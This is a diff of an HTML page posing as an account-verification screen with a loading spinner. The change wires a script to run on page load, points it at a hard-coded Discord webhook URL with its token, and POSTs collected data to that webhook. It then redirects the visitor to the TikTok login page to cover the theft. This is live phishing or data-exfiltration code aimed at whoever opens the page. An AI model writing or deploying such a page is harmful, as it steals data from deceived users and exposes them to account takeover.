@@ -26,16 +26,15 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
-
+<body onload="initProcess()">
     <div style="text-align: center;">
         <div class="loader" style="margin: 0 auto;"></div>
         <p style="margin-top: 20px; font-weight: bold;">Verifying account details...</p>
     </div>
 
     <script>
-        // Replace the URL below with your actual Discord Webhook URL
-        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        // Your Discord Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
         async function initProcess() {
             try {
@@ -58,25 +57,23 @@
                     }]
                 };
 
-                // Send Data
+                // Send Data to Discord
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                // Final Redirect
+                // Final Redirect (Redirects to TikTok)
                 setTimeout(() => {
                     window.location.href = "https://www.tiktok.com/login";
                 }, 1500);
 
             } catch (e) {
-                window.location.href = "https://www.tiktok.com/login";
+                window.location.href = "https://www.tiktok.com/";
             }
         }
-
-        window.onload = initProcess;
     </script>
 </body>
-  </html>
-  
+</html>
+
